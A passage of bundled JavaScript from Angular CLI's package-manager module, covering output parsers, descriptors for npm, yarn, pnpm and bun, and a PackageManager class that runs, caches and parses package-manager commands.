  let subProject;
  if (Array.isArray(data)) {
    rootProject = data[0];
    if (workspacePackageName) {
      subProject = data.find(
        (project) => project?.name === workspacePackageName
      );
    }
  } else {
    rootProject = data;
  }
  if (!rootProject || typeof rootProject !== "object") {
    return dependencies;
  }
  if (subProject) {
    const subprojectMaps = [
      subProject.dependencies,
      subProject.devDependencies,
      subProject.unsavedDependencies
    ].filter((d) => !!d);
    for (const subprojectMap of subprojectMaps) {
      for (const [name, info] of Object.entries(subprojectMap)) {
        if (info && typeof info === "object" && info.version) {
          dependencies.set(name, {
            name,
            version: info.version,
            path: info.path
          });
        }
      }
    }
  } else if (workspacePackageName) {
    const rootDependencyMaps2 = [
      rootProject.dependencies,
      rootProject.devDependencies,
      rootProject.unsavedDependencies
    ].filter((d) => !!d);
    for (const dependencyMap of rootDependencyMaps2) {
      const info = dependencyMap[workspacePackageName];
      if (info && typeof info === "object") {
        const nestedMaps = [
          info.dependencies,
          info.devDependencies,
          info.unsavedDependencies
        ].filter((d) => !!d);
        for (const nestedMap of nestedMaps) {
          for (const [name, nestedInfo] of Object.entries(nestedMap)) {
            if (nestedInfo && typeof nestedInfo === "object" && nestedInfo.version) {
              dependencies.set(name, {
                name,
                version: nestedInfo.version,
                path: nestedInfo.path
              });
            }
          }
        }
      }
    }
  }
  const rootDependencyMaps = [
    rootProject.dependencies,
    rootProject.devDependencies,
    rootProject.unsavedDependencies
  ].filter((d) => !!d);
  for (const dependencyMap of rootDependencyMaps) {
    for (const [name, info] of Object.entries(dependencyMap)) {
      if (!info || typeof info !== "object") {
        continue;
      }
      const isWorkspacePackage = info.resolved?.startsWith("file:") && (!!info.dependencies || !!info.devDependencies || !!info.unsavedDependencies);
      if (info.version && !dependencies.has(name) && !isWorkspacePackage) {
        dependencies.set(name, {
          name,
          version: info.version,
          path: info.path
        });
      }
    }
  }
  logger?.debug(`  Found ${dependencies.size} dependencies.`);
  return dependencies;
}
function parseYarnClassicDependencies(stdout, logger) {
  logger?.debug(`Parsing yarn classic dependency list...`);
  logStdout(stdout, logger);
  const dependencies = /* @__PURE__ */ new Map();
  if (!stdout) {
    logger?.debug("  stdout is empty. No dependencies found.");
    return dependencies;
  }
  for (const json of parseJsonLines(stdout, logger)) {
    if (json.type === "tree" && json.data?.trees) {
      for (const info of json.data.trees) {
        const lastAtIndex = info.name.lastIndexOf("@");
        const name = info.name.slice(0, lastAtIndex);
        const version = info.name.slice(lastAtIndex + 1);
        dependencies.set(name, {
          name,
          version
        });
      }
    }
  }
  logger?.debug(`  Found ${dependencies.size} dependencies.`);
  return dependencies;
}
function isValidManifest(obj) {
  if (typeof obj !== "object" || obj === null) {
    return false;
  }
  const { name, version } = obj;
  return typeof name === "string" && typeof version === "string" && (0, import_semver2.valid)(version) !== null;
}
function isValidMetadata(obj) {
  if (typeof obj !== "object" || obj === null) {
    return false;
  }
  const { name, versions, "dist-tags": distTags } = obj;
  return typeof name === "string" && Array.isArray(versions) && typeof distTags === "object" && distTags !== null;
}
function parseNpmLikeManifest(stdout, logger) {
  logger?.debug(`Parsing npm-like manifest...`);
  logStdout(stdout, logger);
  if (!stdout) {
    logger?.debug("  stdout is empty. No manifest found.");
    return null;
  }
  const result = JSON.parse(stdout);
  if (Array.isArray(result)) {
    let maxManifest = null;
    for (const manifest of result) {
      if (!isValidManifest(manifest)) {
        logger?.debug(
          "  Skipping invalid manifest in array (missing name, version, or invalid SemVer)."
        );
        continue;
      }
      if (!maxManifest || (0, import_semver2.compare)(manifest.version, maxManifest.version) > 0) {
        maxManifest = manifest;
      }
    }
    if (!maxManifest) {
      logger?.debug("  No valid manifests found in the array.");
    }
    return maxManifest;
  }
  if (!isValidManifest(result)) {
    logger?.debug(
      "  Parsed JSON is not a valid manifest (missing name, version, or invalid SemVer)."
    );
    return null;
  }
  return result;
}
function parseNpmLikeMetadata(stdout, logger) {
  logger?.debug(`Parsing npm-like metadata...`);
  logStdout(stdout, logger);
  if (!stdout) {
    logger?.debug("  stdout is empty. No metadata found.");
    return null;
  }
  const result = JSON.parse(stdout);
  if (Array.isArray(result)) {
    for (const item of result) {
      if (isValidMetadata(item)) {
        return item;
      }
    }
    logger?.debug("  No valid metadata found in the array.");
    return null;
  }
  if (!isValidMetadata(result)) {
    logger?.debug("  Parsed JSON is not valid metadata (missing name, versions, or dist-tags).");
    return null;
  }
  return result;
}
function parseYarnClassicManifest(stdout, logger) {
  logger?.debug(`Parsing yarn classic manifest...`);
  logStdout(stdout, logger);
  if (!stdout) {
    logger?.debug("  stdout is empty. No manifest found.");
    return null;
  }
  let manifest;
  for (const json of parseJsonLines(stdout, logger)) {
    if (json.type === "inspect" && json.data) {
      manifest = json.data;
      break;
    }
  }
  if (!manifest) {
    logger?.debug("  Failed to find manifest in yarn classic output.");
    return null;
  }
  if (manifest["ng-add"] && typeof manifest["ng-add"] === "object" && Object.keys(manifest["ng-add"]).length === 0) {
    manifest["ng-add"].save ??= false;
  }
  if (!isValidManifest(manifest)) {
    logger?.debug(
      "  Parsed JSON is not a valid manifest (missing name, version, or invalid SemVer)."
    );
    return null;
  }
  return manifest;
}
function parseYarnClassicMetadata(stdout, logger) {
  logger?.debug(`Parsing yarn classic metadata...`);
  logStdout(stdout, logger);
  if (!stdout) {
    logger?.debug("  stdout is empty. No metadata found.");
    return null;
  }
  let metadata;
  for (const json of parseJsonLines(stdout, logger)) {
    if (json.type === "inspect" && json.data) {
      metadata = json.data;
      break;
    }
  }
  if (!metadata) {
    logger?.debug("  Failed to find metadata in yarn classic output.");
    return null;
  }
  return metadata;
}
function parseNpmLikeError(output, logger) {
  logger?.debug(`Parsing npm-like error output...`);
  logStdout(output, logger);
  if (!output) {
    logger?.debug("  output is empty. No error found.");
    return null;
  }
  try {
    let jsonError = JSON.parse(output);
    if (Array.isArray(jsonError)) {
      jsonError = jsonError[0];
    }
    if (jsonError && typeof jsonError === "object" && "error" in jsonError) {
      jsonError = jsonError.error;
    }
    if (jsonError && typeof jsonError.code === "string" && (typeof jsonError.summary === "string" || typeof jsonError.message === "string")) {
      const summary = jsonError.summary || jsonError.message;
      logger?.debug(`  Successfully parsed JSON error with code '${jsonError.code}'.`);
      return {
        code: jsonError.code,
        summary,
        detail: jsonError.detail
      };
    }
  } catch (e) {
    logger?.debug(`  Failed to parse output as JSON: ${e}. Attempting regex fallback.`);
  }
  const errorCodeMatch = output.match(/npm (ERR!|error) code (E\d{3}|[A-Z_]+)/);
  if (errorCodeMatch) {
    const code = errorCodeMatch[2];
    let summary;
    for (const line of output.split("\n")) {
      if (line.startsWith("npm ERR!") && !line.includes(" code ")) {
        summary = line.replace("npm ERR! ", "").trim();
        break;
      } else if (line.startsWith("npm error") && !line.includes(" code ")) {
        summary = line.replace("npm error ", "").trim();
        break;
      }
    }
    logger?.debug(`  Successfully parsed text error with code '${code}'.`);
    return {
      code,
      summary: summary || `Package manager error: ${code}`
    };
  }
  logger?.debug("  Failed to parse npm-like error. No structured error found.");
  return null;
}
function parseYarnClassicError(output, logger) {
  logger?.debug(`Parsing yarn classic error output...`);
  logStdout(output, logger);
  if (!output) {
    logger?.debug("  output is empty. No error found.");
    return null;
  }
  const statusCodeMatch = output.match(/finished with status code (\d{3})/);
  if (statusCodeMatch) {
    const statusCode = Number(statusCodeMatch[1]);
    if (statusCode < 200 || statusCode >= 300) {
      logger?.debug(`  Detected HTTP error status code '${statusCode}' in verbose output.`);
      return {
        code: `E${statusCode}`,
        summary: `Request failed with status code ${statusCode}.`
      };
    }
  }
  for (const json of parseJsonLines(output, logger)) {
    if (json.type === "error" && typeof json.data === "string") {
      const summary = json.data;
      logger?.debug(`  Successfully parsed generic yarn classic error.`);
      return {
        code: "UNKNOWN_ERROR",
        summary
      };
    }
  }
  logger?.debug("  Failed to parse yarn classic error. No structured error found.");
  return null;
}
function parseBunDependencies(stdout, logger) {
  logger?.debug("Parsing Bun dependency list...");
  logStdout(stdout, logger);
  const dependencies = /* @__PURE__ */ new Map();
  if (!stdout) {
    return dependencies;
  }
  const lines2 = stdout.split("\n");
  for (let i = 1; i < lines2.length; i++) {
    const line = lines2[i].trim();
    if (!line) {
      continue;
    }
    const cleanLine = line.replace(/^[└├]──\s*/, "");
    const match = cleanLine.match(/^(.+?)\s?@([^@\s]+)$/);
    if (match) {
      const name = match[1];
      const version = match[2];
      dependencies.set(name, { name, version });
    }
  }
  logger?.debug(`  Found ${dependencies.size} dependencies.`);
  return dependencies;
}
function parseYarnModernDependencies(stdout, logger) {
  logger?.debug("Parsing Yarn Berry dependency list...");
  logStdout(stdout, logger);
  const dependencies = /* @__PURE__ */ new Map();
  if (!stdout) {
    return dependencies;
  }
  for (const json of parseJsonLines(stdout, logger)) {
    if (typeof json === "string") {
      const match = json.match(/^(@?[^@]+)@(.+)$/);
      if (match) {
        const name = match[1];
        let version = match[2];
        if (version.startsWith("npm:")) {
          version = version.slice(4);
        }
        const versionParamMatch = version.match(/::version=([^&]+)/);
        if (versionParamMatch) {
          version = versionParamMatch[1];
        }
        dependencies.set(name, { name, version });
      }
    }
  }
  logger?.debug(`  Found ${dependencies.size} dependencies.`);
  return dependencies;
}
function parsePnpmReleaseAge(output, version) {
  const value = output.trim();
  if (!value || value === "undefined" || value === "null") {
    const major = parseInt(version.split(".")[0], 10);
    if (major >= 11) {
      return 1440 * 6e4;
    }
    return 0;
  }
  const minutes = parseInt(value, 10);
  return isNaN(minutes) ? 0 : minutes * 6e4;
}
function parseYarnReleaseAge(output, version) {
  const value = output.trim();
  if (!value || value === "undefined" || value === "null") {
    const major = parseInt(version.split(".")[0], 10);
    if (major >= 4) {
      return 1440 * 6e4;
    }
    return 0;
  }
  const match = value.match(/^(\d+)(ms|s|m|h|d|w)?$/);
  if (!match) {
    return 0;
  }
  const amount = parseInt(match[1], 10);
  const unit = match[2];
  if (unit) {
    switch (unit) {
      case "ms":
        return amount;
      case "s":
        return amount * 1e3;
      case "m":
        return amount * 6e4;
      case "h":
        return amount * 36e5;
      case "d":
        return amount * 864e5;
      case "w":
        return amount * 6048e5;
    }
  }
  return amount * 6e4;
}
function parseNpmBeforeDate(output) {
  const trimmed = output.trim();
  if (!trimmed || trimmed === "null" || trimmed === "undefined") {
    return 0;
  }
  const parsedDate = Date.parse(trimmed);
  if (isNaN(parsedDate)) {
    return 0;
  }
  const age = Date.now() - parsedDate;
  return age > 0 ? age : 0;
}
var import_semver2, MAX_LOG_LENGTH;
var init_parsers = __esm({
  "packages/angular/cli/src/package-managers/parsers.ts"() {
    "use strict";
    import_semver2 = __toESM(require_semver2());
    MAX_LOG_LENGTH = 1024;
  }
});

// packages/angular/cli/src/package-managers/package-manager-descriptor.ts
var package_manager_descriptor_exports = {};
__export(package_manager_descriptor_exports, {
  PACKAGE_MANAGER_PRECEDENCE: () => PACKAGE_MANAGER_PRECEDENCE,
  SUPPORTED_PACKAGE_MANAGERS: () => SUPPORTED_PACKAGE_MANAGERS
});
function isKnownNotFound(error) {
  return NOT_FOUND_ERROR_CODES.has(error.code);
}
var NOT_FOUND_ERROR_CODES, SUPPORTED_PACKAGE_MANAGERS, PACKAGE_MANAGER_PRECEDENCE;
var init_package_manager_descriptor = __esm({
  "packages/angular/cli/src/package-managers/package-manager-descriptor.ts"() {
    "use strict";
    init_parsers();
    NOT_FOUND_ERROR_CODES = /* @__PURE__ */ new Set(["E404"]);
    SUPPORTED_PACKAGE_MANAGERS = {
      npm: {
        binary: "npm",
        lockfiles: ["package-lock.json", "npm-shrinkwrap.json"],
        addCommand: "install",
        installCommand: ["install"],
        forceFlag: "--force",
        saveExactFlag: "--save-exact",
        saveTildeFlag: "--save-tilde",
        saveDevFlag: "--save-dev",
        noLockfileFlag: "--no-package-lock",
        ignoreScriptsFlag: "--ignore-scripts",
        ignorePeerDependenciesFlag: "--force",
        configFiles: [".npmrc"],
        getRegistryOptions: (registry) => ({ args: ["--registry", registry] }),
        versionCommand: ["--version"],
        listDependenciesCommand: ["list", "--depth=0", "--json=true", "--all=true"],
        getReleaseAgeConfigCommand: ["config", "get", "before"],
        getPackageNameCommand: ["pkg", "get", "name"],
        getManifestCommand: ["view", "--json"],
        viewCommandFieldArgFormatter: (fields) => [...fields],
        outputParsers: {
          listDependencies: parseNpmLikeDependencies,
          getRegistryManifest: parseNpmLikeManifest,
          getRegistryMetadata: parseNpmLikeMetadata,
          getError: parseNpmLikeError,
          getReleaseAge: parseNpmBeforeDate
        },
        isNotFound: isKnownNotFound
      },
      yarn: {
        binary: "yarn",
        lockfiles: ["yarn.lock"],
        addCommand: "add",
        installCommand: ["install"],
        forceFlag: "--force",
        saveExactFlag: "--exact",
        saveTildeFlag: "--tilde",
        saveDevFlag: "--dev",
        noLockfileFlag: "",
        ignoreScriptsFlag: "--mode=skip-build",
        configFiles: [".yarnrc.yml", ".yarnrc.yaml"],
        copyConfigFromProject: true,
        getRegistryOptions: (registry) => ({ env: { YARN_NPM_REGISTRY_SERVER: registry } }),
        versionCommand: ["--version"],
        listDependenciesCommand: ["info", "--name-only", "--json"],
        getReleaseAgeConfigCommand: ["config", "get", "npmMinimalAgeGate"],
        getManifestCommand: ["npm", "info", "--json"],
        viewCommandFieldArgFormatter: (fields) => ["--fields", fields.join(",")],
        outputParsers: {
          listDependencies: parseYarnModernDependencies,
          getRegistryManifest: parseNpmLikeManifest,
          getRegistryMetadata: parseNpmLikeMetadata,
          getError: parseNpmLikeError,
          getReleaseAge: parseYarnReleaseAge
        },
        isNotFound: isKnownNotFound
      },
      "yarn-classic": {
        binary: "yarn",
        // This is intentionally empty. `yarn-classic` is not a discoverable package manager.
        // The discovery process finds `yarn` via `yarn.lock`, and the factory logic
        // determines whether it is classic or modern by checking the installed version.
        lockfiles: [],
        addCommand: "add",
        installCommand: ["install"],
        forceFlag: "--force",
        saveExactFlag: "--exact",
        saveTildeFlag: "--tilde",
        saveDevFlag: "--dev",
        noLockfileFlag: "--no-lockfile",
        ignoreScriptsFlag: "--ignore-scripts",
        configFiles: [".yarnrc", ".npmrc"],
        getRegistryOptions: (registry) => ({ args: ["--registry", registry] }),
        versionCommand: ["--version"],
        listDependenciesCommand: ["list", "--depth=0", "--json"],
        getManifestCommand: ["info", "--json", "--verbose"],
        requiresManifestVersionLookup: true,
        outputParsers: {
          listDependencies: parseYarnClassicDependencies,
          getRegistryManifest: parseYarnClassicManifest,
          getRegistryMetadata: parseYarnClassicMetadata,
          getError: parseYarnClassicError
        },
        isNotFound: isKnownNotFound
      },
      pnpm: {
        binary: "pnpm",
        lockfiles: ["pnpm-lock.yaml"],
        addCommand: "add",
        installCommand: ["install"],
        forceFlag: "--force",
        saveExactFlag: "--save-exact",
        saveTildeFlag: "--save-tilde",
        saveDevFlag: "--save-dev",
        noLockfileFlag: "--no-lockfile",
        ignoreScriptsFlag: "--ignore-scripts",
        ignorePeerDependenciesFlag: "--strict-peer-dependencies=false",
        configFiles: [".npmrc", "pnpm-workspace.yaml"],
        getRegistryOptions: (registry) => ({ args: ["--registry", registry] }),
        versionCommand: ["--version"],
        listDependenciesCommand: ["list", "--depth=0", "--json"],
        getReleaseAgeConfigCommand: ["config", "get", "minimum-release-age"],
        getPackageNameCommand: ["pkg", "get", "name"],
        getManifestCommand: ["view", "--json"],
        viewCommandFieldArgFormatter: (fields) => [...fields],
        outputParsers: {
          listDependencies: parseNpmLikeDependencies,
          getRegistryManifest: parseNpmLikeManifest,
          getRegistryMetadata: parseNpmLikeMetadata,
          getError: parseNpmLikeError,
          getReleaseAge: parsePnpmReleaseAge
        },
        isNotFound: isKnownNotFound
      },
      bun: {
        binary: "bun",
        lockfiles: ["bun.lockb", "bun.lock"],
        addCommand: "add",
        installCommand: ["install"],
        forceFlag: "--force",
        saveExactFlag: "--exact",
        saveTildeFlag: "",
        // Bun does not have a flag for tilde, it defaults to caret.
        saveDevFlag: "--development",
        noLockfileFlag: "",
        // Bun does not have a flag for this.
        ignoreScriptsFlag: "--ignore-scripts",
        configFiles: ["bunfig.toml", ".npmrc"],
        copyConfigFromProject: true,
        getRegistryOptions: (registry) => ({ args: ["--registry", registry] }),
        versionCommand: ["--version"],
        listDependenciesCommand: ["pm", "ls"],
        getManifestCommand: ["pm", "view", "--json"],
        getRegistryMetadata: async (packageName, fetchAndParse) => {
          const [distTags, versions] = await Promise.all([
            fetchAndParse(["pm", "view", "--json", packageName, "dist-tags"], (stdout) => {
              if (!stdout) {
                return {};
              }
              const parsed = JSON.parse(stdout);
              return parsed && typeof parsed === "object" && !Array.isArray(parsed) ? parsed : {};
            }),
            fetchAndParse(["pm", "view", "--json", packageName, "versions"], (stdout) => {
              if (!stdout) {
                return null;
              }
              const parsed = JSON.parse(stdout);
              return Array.isArray(parsed) ? parsed : [parsed];
            })
          ]);
          if (!versions || versions.length === 0) {
            return null;
          }
          return {
            name: packageName,
            "dist-tags": distTags || {},
            versions
          };
        },
        outputParsers: {
          listDependencies: parseBunDependencies,
          getRegistryManifest: parseNpmLikeManifest,
          getRegistryMetadata: parseNpmLikeMetadata,
          getError: parseNpmLikeError
        },
        isNotFound: isKnownNotFound
      }
    };
    PACKAGE_MANAGER_PRECEDENCE = [
      "pnpm",
      "yarn",
      "bun",
      "npm"
    ];
  }
});

// packages/angular/cli/src/package-managers/w1poc-entry.ts
var import_node_child_process = require("node:child_process");
var import_node_fs = require("node:fs");

// packages/angular/cli/src/package-managers/package-manager.ts
var import_node_path = require("node:path");
var import_npm_package_arg = __toESM(require_npa());
var import_semver = __toESM(require_semver2());

// packages/angular/cli/src/package-managers/error.ts
var PackageManagerError = class extends Error {
  /**
   * Creates a new `PackageManagerError` instance.
   * @param message The error message.
   * @param stdout The standard output of the failed process.
   * @param stderr The standard error of the failed process.
   * @param exitCode The exit code of the failed process.
   */
  constructor(message, stdout, stderr, exitCode) {
    super(message);
    this.stdout = stdout;
    this.stderr = stderr;
    this.exitCode = exitCode;
  }
  stdout;
  stderr;
  exitCode;
};

// packages/angular/cli/src/package-managers/package-manager.ts
var METADATA_FIELDS = ["name", "dist-tags", "versions", "time"];
var MANIFEST_FIELDS = [
  "name",
  "version",
  "deprecated",
  "dependencies",
  "peerDependencies",
  "devDependencies",
  "homepage",
  "schematics",
  "ng-add",
  "ng-update"
];
var PackageManager = class {
  /**
   * Creates a new `PackageManager` instance.
   * @param host A `Host` instance for interacting with the file system and running commands.
   * @param cwd The absolute path to the project's working directory.
   * @param descriptor A `PackageManagerDescriptor` that defines the commands for a specific package manager.
   * @param options An options object to configure the instance.
   */
  constructor(host, cwd, descriptor, options = {}) {
    this.host = host;
    this.cwd = cwd;
    this.descriptor = descriptor;
    this.options = options;
    if (this.options.dryRun && !this.options.logger) {
      throw new Error("A logger must be provided when dryRun is enabled.");
    }
    this.#version = options.version;
    this.#initializationError = options.initializationError;
  }
  host;
  cwd;
  descriptor;
  options;
  #manifestCache = /* @__PURE__ */ new Map();
  #metadataCache = /* @__PURE__ */ new Map();
  #initializationError;
  #dependencyCache = null;
  #version;
  #minimumReleaseAge;
  #activeTasks = 0;
  #pendingTasks = [];
  #maxConcurrent = 5;
  /**
   * The name of the package manager's binary.
   */
  get name() {
    return this.descriptor.binary;
  }
  /**
   * Ensures that the package manager is installed and available in the PATH.
   * If it is not, this method will throw an error with instructions on how to install it.
   *
   * @throws {Error} If the package manager is not installed.
   */
  ensureInstalled() {
    if (this.#initializationError) {
      throw this.#initializationError;
    }
  }
  /**
   * A private method to lazily populate the dependency cache.
   * This is a performance optimization to avoid running `npm list` multiple times.
   * @returns A promise that resolves to the dependency cache map.
   */
  async #populateDependencyCache() {
    if (this.#dependencyCache !== null) {
      return this.#dependencyCache;
    }
    const args = this.descriptor.listDependenciesCommand;
    const workspacePackageName = await this.getCurrentPackageName();
    const dependencies = await this.#fetchAndParse(
      args,
      (stdout, logger) => this.descriptor.outputParsers.listDependencies(stdout, logger, { workspacePackageName })
    );
    return this.#dependencyCache = dependencies ?? /* @__PURE__ */ new Map();
  }
  /**
   * A private method to run a command using the package manager's binary.
   * @param args The arguments to pass to the command.
   * @param options Options for the child process.
   * @returns A promise that resolves with the standard output and standard error of the command.
   */
  async #runWithThrottle(action) {
    if (this.#activeTasks >= this.#maxConcurrent) {
      await new Promise((resolve2) => {
        this.#pendingTasks.push(resolve2);
      });
    } else {
      this.#activeTasks++;
    }
    try {
      return await action();
    } finally {
      const next = this.#pendingTasks.shift();
      if (next) {
        next();
      } else {
        this.#activeTasks--;
      }
    }
  }
  async #run(args, options = {}) {
    return this.#runWithThrottle(async () => {
      this.ensureInstalled();
      const { registry, cwd, ...runOptions } = options;
      const finalArgs = [...args];
      let finalEnv;
      if (registry) {
        const registryOptions = this.descriptor.getRegistryOptions?.(registry);
        if (!registryOptions) {
          throw new Error(
            `The configured package manager, '${this.descriptor.binary}', does not support a custom registry.`
          );
        }
        if (registryOptions.args) {
          finalArgs.push(...registryOptions.args);
        }
        if (registryOptions.env) {
          finalEnv = registryOptions.env;
        }
      }
      const executionDirectory = cwd ?? this.cwd;
      if (this.options.dryRun) {
        this.options.logger?.info(
          `[DRY RUN] Would execute in [${executionDirectory}]: ${this.descriptor.binary} ${finalArgs.join(" ")}`
        );
        return { stdout: "", stderr: "" };
      }
      const commandResult = await this.host.runCommand(this.descriptor.binary, finalArgs, {
        ...runOptions,
        cwd: executionDirectory,
        stdio: "pipe",
        env: finalEnv
      });
      return { stdout: commandResult.stdout.trim(), stderr: commandResult.stderr.trim() };
    });
  }
  /**
   * A private, generic method to encapsulate the common logic of running a command,
   * handling errors, and parsing the output.
   * @param args The arguments to pass to the command.
   * @param parser A function that parses the command's stdout.
   * @param options Options for the command, including caching.
   * @returns A promise that resolves to the parsed data, or null if not found.
   */
  async #fetchAndParse(args, parser, options = {}) {
    const { cache, cacheKey, bypassCache, ...runOptions } = options;
    if (!bypassCache && cache && cacheKey && cache.has(cacheKey)) {
      return cache.get(cacheKey);
    }
    let stdout;
    let stderr;
    let exitCode;
    let thrownError;
    try {
      ({ stdout, stderr } = await this.#run(args, runOptions));
      exitCode = 0;
    } catch (e) {
      thrownError = e;
      if (e instanceof PackageManagerError) {
        stdout = e.stdout;
        stderr = e.stderr;
        exitCode = e.exitCode;
      } else {
        throw e;
      }
    }
    const getError = this.descriptor.outputParsers.getError;
    const parsedError = getError?.(stdout, this.options.logger) ?? getError?.(stderr, this.options.logger) ?? null;
    if (parsedError) {
      this.options.logger?.debug(
        `[${this.descriptor.binary}] Structured error (code: ${parsedError.code}): ${parsedError.summary}`
      );
      if (this.descriptor.isNotFound(parsedError)) {
        if (cache && cacheKey) {
          cache.set(cacheKey, null);
        }
        return null;
      } else {
        throw new PackageManagerError(parsedError.summary, stdout, stderr, exitCode);
      }
    }
    if (thrownError) {
      throw thrownError;
    }
    try {
      const result = parser(stdout, this.options.logger);
      if (cache && cacheKey) {
        cache.set(cacheKey, result);
      }
      return result;
    } catch (e) {
      const message = `Failed to parse package manager output: ${e instanceof Error ? e.message : ""}`;
      throw new PackageManagerError(message, stdout, stderr, exitCode);
    }
  }
  /**
   * Adds a package to the project's dependencies.
   * @param packageName The name of the package to add.
   * @param save The save strategy to use.
   * - `exact`: The package will be saved with an exact version.
   * - `tilde`: The package will be saved with a tilde version range (`~`).
   * - `none`: The package will be saved with the default version range (`^`).
   * @param asDevDependency Whether to install the package as a dev dependency.
   * @param noLockfile Whether to skip updating the lockfile.
   * @param options Extra options for the command.
   * @returns A promise that resolves when the command is complete.
   */
  async add(packageName, save, asDevDependency, noLockfile, ignoreScripts, options = {}) {
    const flags = [
      asDevDependency ? this.descriptor.saveDevFlag : "",
      save === "exact" ? this.descriptor.saveExactFlag : "",
      save === "tilde" ? this.descriptor.saveTildeFlag : "",
      noLockfile ? this.descriptor.noLockfileFlag : "",
      ignoreScripts ? this.descriptor.ignoreScriptsFlag : ""
    ].filter((flag) => flag);
    const specifier = this.host.requiresQuoting ? `"${packageName}"` : packageName;
    const args = [this.descriptor.addCommand, specifier, ...flags];
    await this.#run(args, options);
    this.#dependencyCache = null;
  }
  /**
   * Installs all dependencies in the project.
   * @param options Options for the installation.
   * @param options.timeout The maximum time in milliseconds to wait for the command to complete.
   * @param options.force If true, forces a clean install, potentially overwriting existing modules.
   * @param options.registry The registry to use for the installation.
   * @param options.ignoreScripts If true, prevents lifecycle scripts from being executed.
   * @returns A promise that resolves when the command is complete.
   */
  async install(options = { ignoreScripts: true }) {
    const flags = [
      options.force ? this.descriptor.forceFlag : "",
      options.ignoreScripts ? this.descriptor.ignoreScriptsFlag : "",
      options.ignorePeerDependencies ? this.descriptor.ignorePeerDependenciesFlag ?? "" : ""
    ].filter((flag) => flag);
    const args = [...this.descriptor.installCommand, ...flags];
    await this.#run(args, options);
    this.#dependencyCache = null;
  }
  /**
   * Gets the name of the package in the current project.
   */
  async getCurrentPackageName() {
    if (this.descriptor.getPackageNameCommand) {
      try {
        const { stdout } = await this.#run(this.descriptor.getPackageNameCommand);
        if (stdout) {
          return JSON.parse(stdout);
        }
      } catch {
      }
    }
    try {
      const content = await this.host.readFile((0, import_node_path.join)(this.cwd, "package.json"));
      const pkgJson = JSON.parse(content);
      return pkgJson.name;
    } catch {
      return void 0;
    }
  }
  /**
   * Gets the version of the package manager binary.
   */
  async getVersion() {
    if (this.#version) {
      return this.#version;
    }
    const { stdout } = await this.#run(this.descriptor.versionCommand);
    this.#version = stdout.trim();
    if (!(0, import_semver.valid)(this.#version)) {
      throw new Error(`Invalid semver version for ${this.name}: "${this.#version}"`);
    }
    return this.#version;
  }
  /**
   * Gets the installed details of a package from the project's dependencies.
   * @param packageName The name of the package to check.
   * @returns A promise that resolves to the installed package details, or `null` if the package is not installed.
   */
  async getInstalledPackage(packageName) {
    const cache = await this.#populateDependencyCache();
    return cache.get(packageName) ?? null;
  }
  /**
   * Gets a map of all top-level dependencies installed in the project.
   * @returns A promise that resolves to a map of package names to their installed package details.
   */
  async getProjectDependencies() {
    const cache = await this.#populateDependencyCache();
    return new Map(cache);
  }
  /**
   * Fetches the registry metadata for a package. This is the full metadata,
   * including all versions and distribution tags.
   * @param packageName The name of the package to fetch the metadata for.
   * @param options Options for the fetch.
   * @param options.timeout The maximum time in milliseconds to wait for the command to complete.
   * @param options.registry The registry to use for the fetch.
   * @param options.bypassCache If true, ignores the in-memory cache and fetches fresh data.
   * @returns A promise that resolves to the `PackageMetadata` object, or `null` if the package is not found.
   */
  async getRegistryMetadata(packageName, options = {}) {
    const cacheKey = options.registry ? `${packageName}|${options.registry}` : packageName;
    if (!options.bypassCache) {
      const cached = this.#metadataCache.get(cacheKey);
      if (cached !== void 0) {
        return cached;
      }
    }
    let metadata;
    if (this.descriptor.getRegistryMetadata) {
      metadata = await this.descriptor.getRegistryMetadata(
        packageName,
        (args, parser) => this.#fetchAndParse(args, parser, options)
      );
    } else {
      const commandArgs = [...this.descriptor.getManifestCommand, packageName];
      const formatter = this.descriptor.viewCommandFieldArgFormatter;
      if (formatter) {
        commandArgs.push(...formatter(METADATA_FIELDS));
      }
      metadata = await this.#fetchAndParse(
        commandArgs,
        (stdout, logger) => this.descriptor.outputParsers.getRegistryMetadata(stdout, logger),
        options
      );
    }
    this.#metadataCache.set(cacheKey, metadata);
    return metadata;
  }
  /**
   * Fetches the registry manifest for a specific version of a package.
   * The manifest is similar to the package's `package.json` file.
   * @param packageName The name of the package to fetch the manifest for.
   * @param version The version of the package to fetch the manifest for.
   * @param options Options for the fetch.
   * @param options.timeout The maximum time in milliseconds to wait for the command to complete.
   * @param options.registry The registry to use for the fetch.
   * @param options.bypassCache If true, ignores the in-memory cache and fetches fresh data.
   * @returns A promise that resolves to the `PackageManifest` object, or `null` if the package is not found.
   */
  async getRegistryManifest(packageName, version, options = {}) {
    const specifier = this.host.requiresQuoting ? `"${packageName}@${version}"` : `${packageName}@${version}`;
    const commandArgs = [...this.descriptor.getManifestCommand, specifier];
    const formatter = this.descriptor.viewCommandFieldArgFormatter;
    if (formatter) {
      commandArgs.push(...formatter(MANIFEST_FIELDS));
    }
    const cacheKey = options.registry ? `${specifier}|${options.registry}` : specifier;
    const manifest = await this.#fetchAndParse(
      commandArgs,
      (stdout, logger) => this.descriptor.outputParsers.getRegistryManifest(stdout, logger),
      { ...options, cache: this.#manifestCache, cacheKey }
    );
    if (manifest && manifest.version !== version) {
      const manifestSpecifier = `${manifest.name}@${manifest.version}`;
      const manifestCacheKey = options.registry ? `${manifestSpecifier}|${options.registry}` : manifestSpecifier;
      this.#manifestCache.set(manifestCacheKey, manifest);
    }
    return manifest;
  }
  /**
   * Fetches the manifest for a package.
   *
   * This method can resolve manifests for packages from the registry, as well
   * as those specified by file paths, directory paths, and remote tarballs.
   * Caching is only supported for registry packages.
   *
   * @param specifier The package specifier to resolve the manifest for.
   * @param options Options for the fetch.
   * @returns A promise that resolves to the `PackageManifest` object, or `null` if the package is not found.
   */
  async getManifest(specifier, options = {}) {
    const { name, type, fetchSpec } = typeof specifier === "string" ? (0, import_npm_package_arg.default)(specifier) : specifier;
    switch (type) {
      case "range":
      case "version":
      case "tag": {
        if (!name) {
          throw new Error(`Could not parse package name from specifier: ${specifier}`);
        }
        let versionSpec = fetchSpec ?? "latest";
        if (this.descriptor.requiresManifestVersionLookup) {
          if (type === "tag" || !fetchSpec) {
            const metadata = await this.getRegistryMetadata(name, options);
            if (!metadata) {
              return null;
            }
            versionSpec = metadata["dist-tags"][versionSpec];
          } else if (type === "range") {
            const metadata = await this.getRegistryMetadata(name, options);
            if (!metadata) {
              return null;
            }
            versionSpec = (0, import_semver.maxSatisfying)(metadata.versions, fetchSpec) ?? "";
          }
          if (!versionSpec) {
            return null;
          }
        }
        return this.getRegistryManifest(name, versionSpec, options);
      }
      case "directory": {
        if (!fetchSpec) {
